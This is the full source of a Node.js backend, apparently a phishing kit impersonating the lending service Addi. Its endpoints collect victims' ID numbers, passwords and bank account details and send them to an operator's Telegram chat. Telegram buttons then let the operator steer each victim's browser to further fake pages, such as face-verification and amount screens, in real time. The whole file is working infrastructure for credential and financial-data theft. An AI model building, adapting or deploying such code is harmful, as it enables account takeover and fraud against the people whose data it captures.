// server.js - Addi Telegram Integration
const cors = require("cors");
const express = require("express");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
const fetch = require("node-fetch");
const app = express();
dotenv.config();

app.use(cors({
  origin: true,
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"],
  optionsSuccessStatus: 204
}));

app.options("*", cors());

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

app.use(bodyParser.json());

const sessions = new Map();

const getTelegramApiUrl = (method) => `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;

// Eliminar botones de un mensaje
async function eliminarBotones(chatId, messageId) {
  try {
    await fetch(getTelegramApiUrl('editMessageReplyMarkup'), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: [] }
      })
    });
    console.log(`✅ Botones eliminados del mensaje ${messageId}`);
  } catch (e) {
    console.error("❌ Error al eliminar botones:", e.message);
  }
}

// Enviar mensaje con botones
async function enviarMensajeTelegram({ cedula, docType, password, sessionId }) {
  const mensaje = `
📋 SOLICITUD ADDI ✨
👤 Cédula: ${docType} ${cedula}
🔑 Contraseña: ${password}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}

⏳ Esperando decisión del admin...
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "❌ ERROR LOG → face.html", callback_data: `face_${sessionId}` },
        { text: "✅ FINALIZAR → montos.html", callback_data: `montos_${sessionId}` }
      ],
      [
        { text: "📋 SOLICITUD → idfy.html", callback_data: `idfy_${sessionId}` }
      ]
    ]
  };

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup: botones
    })
  });

  const data = await response.json();

  if (data.ok && data.result) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// Enviar mensaje con datos de cuenta al Telegram
async function enviarMensajeCuenta({ cedula, docType, cuenta, tipoCuenta, banco, sessionId }) {
  const mensaje = `
🏦 DATOS DE CUENTA TITULAR
👤 Titular: ${docType} ${cedula}
🔢 Número de cuenta: ${cuenta}
💳 Tipo: ${tipoCuenta}
🏛️ Banco: ${banco}
⏰ Hora: ${new Date().toLocaleTimeString('es-CO')}

⏳ Esperando decisión del admin...
`;

  const botones = {
    inline_keyboard: [
      [
        { text: "❌ ERROR LOG → face.html", callback_data: `face_${sessionId}` },
        { text: "✅ FINALIZAR → montos.html", callback_data: `montos_${sessionId}` }
      ]
    ]
  };

  const response = await fetch(getTelegramApiUrl('sendMessage'), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, reply_markup: botones })
  });

  const data = await response.json();
  if (data.ok && data.result) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.last_message_id = data.result.message_id;
    sessions.set(sessionId, sessionData);
  }
}

// POST /cuentatitular - Recibe datos de cuenta bancaria
app.post("/cuentatitular", async (req, res) => {
  const { session_id, cedula, docType, cuenta, tipoCuenta, banco } = req.body;
  const sessionId = session_id;

  if (sessionId && cuenta && tipoCuenta && banco) {
    const sessionData = sessions.get(sessionId) || { redirect_to: null };
    sessionData.redirect_to = null;
    sessions.set(sessionId, sessionData);

    await enviarMensajeCuenta({ cedula, docType, cuenta, tipoCuenta, banco, sessionId });
    return res.json({ ok: true });
  }

  return res.status(400).json({ error: "Faltan parámetros" });
});

// POST /virtualpersona - Recibe cedula + contraseña
app.post("/virtualpersona", async (req, res) => {
  const { session_id, cedula, docType, password } = req.body;
  const sessionId = session_id;

  if (sessionId && cedula && docType && password) {
    sessions.set(sessionId, { redirect_to: null });
    await enviarMensajeTelegram({ cedula, docType, password, sessionId });
    return res.json({ ok: true });
  }

  return res.status(400).json({ error: "Faltan parámetros" });
});

// GET /instruction/{sessionId} - Polling
app.get("/instruction/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const estado = sessions.get(sessionId);

  if (!estado) return res.json({ redirect_to: null });

  if (estado.redirect_to) {
    const redireccion = estado.redirect_to;
    estado.redirect_to = null;
    sessions.set(sessionId, estado);
    return res.json({ redirect_to: redireccion });
  }

  return res.json({ redirect_to: null });
});

// POST /webhook/{BOT_TOKEN} - Webhook de Telegram
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;

    if (callback_query) {
      const callbackData = callback_query.data || '';
      console.log('🔥 Callback recibido:', callbackData);

      const parts = callbackData.split('_');
      const action = parts[0];
      const sessionId = parts.slice(1).join('_');

      console.log('🎯 Acción:', action);
      console.log('🆔 SessionId:', sessionId);

      try {
        await eliminarBotones(
          callback_query.message.chat.id,
          callback_query.message.message_id
        );
      } catch (editError) {
        console.log('⚠️ No se pudo eliminar el menú');
      }

      const sessionData = sessions.get(sessionId) || { redirect_to: null };
      sessionData.redirect_to = action;
      sessions.set(sessionId, sessionData);

      await fetch(getTelegramApiUrl('answerCallbackQuery'), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: callback_query.id,
          text: `✅ Redirigiendo a ${action}.html`,
          show_alert: false
        })
      });

      console.log(`📄 Redirección configurada: ${sessionId} → ${action}.html`);
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Error en webhook:", err);
    res.sendStatus(200);
  }
});

// Health check
app.get("/health", (req, res) => {
  res.json({ status: "ok" });
});

// Home
app.get("/", (req, res) => {
  res.send("Backend Addi Telegram ✅");
});

app.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════╗
║   ✅ SERVIDOR ADDI ACTIVO                 ║
║   📡 Puerto: ${PORT}                        ║
║   🤖 Bot: ${BOT_TOKEN ? '✔' : '✗'}                     ║
║   💬 Chat: ${CHAT_ID ? '✔' : '✗'}                    ║
╚═══════════════════════════════════════════╝
  `);
});

// Keepalive — self-ping cada 14 min para que Render no duerma el server
const SELF_URL = 'https://shinys-pops.onrender.com/health';
setInterval(() => {
  fetch(SELF_URL)
    .then(() => console.log(`[KEEPALIVE] ${new Date().toISOString()}`))
    .catch(e => console.error('[KEEPALIVE ERROR]', e.message));
}, 14 * 60 * 1000);
